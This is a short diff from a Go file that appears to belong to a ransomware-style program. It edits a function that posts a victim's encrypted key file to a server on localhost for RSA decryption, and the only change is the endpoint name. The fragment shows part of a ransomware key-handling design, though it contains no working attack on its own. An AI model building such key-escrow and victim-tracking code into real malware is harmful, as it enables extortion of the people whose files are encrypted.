@@ -76,7 +76,7 @@ func (vi *VictimIndentifier) GetPublicIP() error {
 // GetKeyFromServer sends the key.txt data to the server and then the server
 // decrypts the data using the rsa private key.
 func GetKeyFromServer(keyFileData []byte) ([]byte, error) {
-	req, err := http.NewRequest("POST", "http://localhost:8080/decrypt_key", bytes.NewBuffer(keyFileData))
+	req, err := http.NewRequest("POST", "http://localhost:8080/decrypt", bytes.NewBuffer(keyFileData))
 	if err != nil {
 		return nil, err
 	}
